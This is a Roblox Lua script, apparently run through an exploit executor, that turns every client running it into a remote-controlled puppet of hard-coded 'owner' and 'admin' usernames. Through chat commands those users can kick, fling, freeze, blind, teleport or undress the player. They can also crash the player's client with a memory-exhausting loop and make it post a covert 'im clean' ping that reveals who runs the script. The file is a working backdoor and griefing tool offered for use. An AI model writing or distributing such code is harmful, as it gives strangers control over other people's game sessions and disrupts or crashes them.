local CONFIG = {
   OWNERS = {"engravingangels", "Devsf3x", "extra", "extra1"},
   ADMINS = {"Chaycebo2002", "Randool", "extra2"},
   COMMANDS = {
        FLING = "/f", 
        STOP_FLING = "/sf",
        KICK = "/kick", 
        KICKALL = "/kickall", 
        TPALL = "/tpall",
        FREEZE = "/freeze", 
        UNFREEZE = "/unfreeze", 
        BLIND = "/blind",
        UNBLIND = "/unblind", 
        CRASH = "/crash", 
        SPEED = "/speed",
        JUMP = "/jump", 
        NUDE = "/n",
        UNNUDE = "/unn", 
        RELOADLIST = "/reloadlist",
    },
    PING_PHRASE = "im clean",
}

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TextChat = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer

local function IsOwner(player)
    if not player then return false end
    local playerNameLower = player.Name:lower()
    for _, name in ipairs(CONFIG.OWNERS) do
        if playerNameLower == name:lower() then return true end
    end
    return false
end

local function IsAdmin(player)
    if not player then return false end
    local playerNameLower = player.Name:lower()
    for _, name in ipairs(CONFIG.ADMINS) do
        if playerNameLower == name:lower() then return true end
    end
    return false
end

local function GetPlayerRole(player)
    if IsOwner(player) then return "Owner"
    elseif IsAdmin(player) then return "Admin"
    else return "User" end
end

local function CanTarget(executor, target)
    if IsOwner(executor) then return true end
    
    if IsAdmin(executor) and IsOwner(target) then return false end
    
    if IsAdmin(executor) and IsAdmin(target) and executor ~= target then return false end
    
    if IsAdmin(executor) then return true end
    
    return false
end

local function AmIOwner()
    return IsOwner(LocalPlayer)
end

local function AmIAdmin()
    return IsAdmin(LocalPlayer)
end

local function SendCommand(cmd)
    if TextChat.ChatVersion == Enum.ChatVersion.TextChatService then
        local channels = TextChat:FindFirstChild("TextChannels")
        if channels then
            local channel = channels:FindFirstChild("RBXGeneral") or channels:FindFirstChildWhichIsA("TextChannel")
            if channel then 
                channel:SendAsync(cmd)
                return 
            end
        end
    end
    
    local Chat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
    if Chat and Chat:FindFirstChild("SayMessageRequest") then
        Chat.SayMessageRequest:FireServer(cmd, "All")
    end
end

local State = {
    isFlinging = false, isFrozen = false, isBlind = false, 
    isNude = false,
    savedWalkSpeed = 16, savedJumpPower = 50,
    flingConn = nil, flingBV = nil, flingHeartbeat = nil,
    blindFrame = nil, blindGui = nil,
    nudeSaved = {},
    freezeConn = nil,
    frozenPosition = nil,
    frozenCFrame = nil
}

local function CmdStopFling()
    if not State.isFlinging then return end
    State.isFlinging = false
    if State.flingBV then 
        pcall(function() State.flingBV:Destroy() end) 
        State.flingBV = nil 
    end
    if State.flingHeartbeat then 
        State.flingHeartbeat:Disconnect() 
        State.flingHeartbeat = nil 
    end
end

local function CmdFling()
    if State.isFlinging then CmdStopFling() task.wait(0.3) end
    
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    State.isFlinging = true
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
    bv.Velocity = Vector3.new(math.random(-100,100), math.random(50,150), math.random(-100,100)).Unit * 300
    bv.Parent = hrp
    State.flingBV = bv
    
    State.flingHeartbeat = RunService.Heartbeat:Connect(function()
        if not State.isFlinging or not bv or not bv.Parent then 
            CmdStopFling()
        elseif bv and bv.Parent then
            if math.random(1, 30) == 1 then
                bv.Velocity = Vector3.new(math.random(-150,150), math.random(50,200), math.random(-150,150)).Unit * 350
            end
        end
    end)
end

local function CmdKick(executor)
    task.wait(0.5)
    LocalPlayer:Kick("\n\nKicked by " .. (executor and executor.Name or "Owner"))
end

local function CmdFreeze()
    local char = LocalPlayer.Character
    if not char or State.isFrozen then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp then return end

    State.frozenPosition = hrp.Position
    State.frozenCFrame = hrp.CFrame

    State.savedWalkSpeed = hum.WalkSpeed
    State.savedJumpPower = hum.JumpPower

    hum.WalkSpeed = 0
    hum.JumpPower = 0
    hum.PlatformStand = true

    if State.freezeConn then State.freezeConn:Disconnect() end
    State.freezeConn = RunService.Heartbeat:Connect(function()
        local currentChar = LocalPlayer.Character
        local currentHum = currentChar and currentChar:FindFirstChildOfClass("Humanoid")
        local currentHrp = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
        
        if currentHum and currentHrp and State.isFrozen then
            if currentHum.WalkSpeed ~= 0 then currentHum.WalkSpeed = 0 end
            if currentHum.JumpPower ~= 0 then currentHum.JumpPower = 0 end
            if not currentHum.PlatformStand then currentHum.PlatformStand = true end
            
            if State.frozenPosition and (currentHrp.Position - State.frozenPosition).Magnitude > 2 then
                currentHrp.CFrame = State.frozenCFrame
            end
        elseif State.isFrozen then
            CmdUnfreeze()
        end
    end)

    State.isFrozen = true
end

local function CmdUnfreeze()
    if not State.isFrozen then return end
    
    local char = LocalPlayer.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.WalkSpeed = State.savedWalkSpeed
            hum.JumpPower = State.savedJumpPower
            hum.PlatformStand = false
        end
    end

    if State.freezeConn then
        State.freezeConn:Disconnect()
        State.freezeConn = nil
    end
    
    State.frozenPosition = nil
    State.frozenCFrame = nil
    State.isFrozen = false
end

local function CmdBlind()
    if State.isBlind then return end
    
    if State.blindGui then 
        pcall(function() State.blindGui:Destroy() end) 
    end

    State.blindGui = Instance.new("ScreenGui")
    State.blindGui.ResetOnSpawn = false
    State.blindGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    State.blindGui.Name = "BlindGUI"
    State.blindGui.IgnoreGuiInset = true

    State.blindFrame = Instance.new("Frame")
    State.blindFrame.Size = UDim2.new(1, 0, 1, 0)
    State.blindFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    State.blindFrame.BackgroundTransparency = 0
    State.blindFrame.BorderSizePixel = 0
    State.blindFrame.ZIndex = 9999
    State.blindFrame.Parent = State.blindGui

    local success, err = pcall(function()
        State.blindGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    end)
    
    if not success then
        pcall(function()
            State.blindGui.Parent = game:GetService("CoreGui")
        end)
    end
    
    State.isBlind = true
end

local function CmdUnblind()
    if not State.isBlind then return end
    
    if State.blindGui then
        pcall(function() State.blindGui:Destroy() end)
        State.blindGui = nil
        State.blindFrame = nil
    end
    
    State.isBlind = false
end

local function CmdCrash()
    -- Crash command - only owners can use this
    -- Admins cannot use crash
    if not AmIOwner() then return end
    
    task.wait(0.3)
    local startTime = tick()
    pcall(function()
        local largeTable = {}
        for i = 1, 5000 do
            largeTable[i] = string.rep("A", 10000)
            if tick() - startTime > 2 then break end
        end
        while tick() - startTime < 5 do
            local t = {}
            for i = 1, 500 do 
                t[i] = "AAAAAAAAAA" 
            end
        end
    end)
end

local function CmdSpeed(args)
    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    
    local s = args and args[2] and tonumber(args[2])
    
    if s then
        s = math.clamp(s, 0, 250)
        hum.WalkSpeed = s
        State.savedWalkSpeed = s
    else
        hum.WalkSpeed = 16
        State.savedWalkSpeed = 16
    end
end

local function CmdJump(args)
    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    
    local p = args and args[2] and tonumber(args[2])
    
    if p then
        p = math.clamp(p, 0, 500)
        hum.JumpPower = p
        State.savedJumpPower = p
    else
        hum.JumpPower = 50
        State.savedJumpPower = 50
    end
end

local function CmdNude()
    if State.isNude then return end
    
    local char = LocalPlayer.Character
    if not char then return end
    
    State.nudeSaved = {}
    local toRemove = {}
    
    for _, item in ipairs(char:GetChildren()) do
        if item:IsA("Shirt") or item:IsA("Pants") or item:IsA("Accessory") then
            table.insert(toRemove, item)
        end
    end
    
    for _, item in ipairs(toRemove) do
        table.insert(State.nudeSaved, {item, item.Parent})
        item.Parent = nil
    end
    
    State.isNude = true
end

local function CmdUnnude()
    if not State.isNude then return end
    
    for _, data in ipairs(State.nudeSaved) do
        pcall(function()
            if data[1] and data[2] and not data[1].Parent then
                data[1].Parent = data[2]
            end
        end)
    end
    
    State.nudeSaved = {}
    State.isNude = false
end

local function CmdReloadlist(args)
    local phrase = args[2] or CONFIG.PING_PHRASE
    task.wait(math.random(0.5, 1.5))
    SendCommand(phrase)
end

local function HandleCommand(executor, message)
    --
    if not (IsOwner(executor) or IsAdmin(executor)) then 
        return 
    end
    
    local msg = message:lower():gsub("^%s+", ""):gsub("%s+$", "")
    local cmd = msg:match("^/%S+")
    if not cmd then return end

    local args = {}
    for arg in msg:gmatch("%S+") do 
        table.insert(args, arg) 
    end

    if cmd == CONFIG.COMMANDS.CRASH and not IsOwner(executor) then
        return
    end

    local targetName = msg:match("^/%S+%s+(%S+)")
    local isGlobal = (cmd == CONFIG.COMMANDS.KICKALL or cmd == CONFIG.COMMANDS.TPALL or cmd == CONFIG.COMMANDS.RELOADLIST)
    
    local targetsLocalPlayer = isGlobal or not targetName or LocalPlayer.Name:lower():find(targetName, 1, true)
    
    if targetsLocalPlayer and not CanTarget(executor, LocalPlayer) then
        return
    end

    local commands = {
        [CONFIG.COMMANDS.FLING] = CmdFling,
        [CONFIG.COMMANDS.STOP_FLING] = CmdStopFling,
        [CONFIG.COMMANDS.KICK] = function() CmdKick(executor) end,
        [CONFIG.COMMANDS.KICKALL] = function() 
            if CanTarget(executor, LocalPlayer) then
                CmdKick(executor) 
            end
        end,
        [CONFIG.COMMANDS.TPALL] = function()
            if not CanTarget(executor, LocalPlayer) then return end
            
            local owners = {}
            for _, p in ipairs(Players:GetPlayers()) do
                if IsOwner(p) and p ~= LocalPlayer then 
                    table.insert(owners, p) 
                end
            end
            local owner = owners[1]
            if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp and owner.Character.HumanoidRootPart then
                    hrp.CFrame = owner.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
                end
            end
        end,
        [CONFIG.COMMANDS.FREEZE] = CmdFreeze,
        [CONFIG.COMMANDS.UNFREEZE] = CmdUnfreeze,
        [CONFIG.COMMANDS.BLIND] = CmdBlind,
        [CONFIG.COMMANDS.UNBLIND] = CmdUnblind,
        [CONFIG.COMMANDS.CRASH] = CmdCrash,
        [CONFIG.COMMANDS.SPEED] = function() CmdSpeed(args) end,
        [CONFIG.COMMANDS.JUMP] = function() CmdJump(args) end,
        [CONFIG.COMMANDS.NUDE] = CmdNude,
        [CONFIG.COMMANDS.UNNUDE] = CmdUnnude,
        [CONFIG.COMMANDS.RELOADLIST] = function() 
            if CanTarget(executor, LocalPlayer) then
                CmdReloadlist(args) 
            end
        end,
    }

    local func = commands[cmd]
    if func then 
        task.spawn(func)
    end
end

-- event setup
local function SetupPlayer(player)
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg)
            HandleCommand(player, msg)
        end)
    end
end

-- Setup existing players
for _, player in ipairs(Players:GetPlayers()) do
    SetupPlayer(player)
end

-- Setup new players
Players.PlayerAdded:Connect(SetupPlayer)

-- Cleanup on reset
LocalPlayer.CharacterAdded:Connect(function()
    -- Reset states that depend on character
    if State.isFlinging then CmdStopFling() end
    if State.isNude then
        State.nudeSaved = {}
        State.isNude = false
    end
    if State.isFrozen then
        CmdUnfreeze()
    end
end)
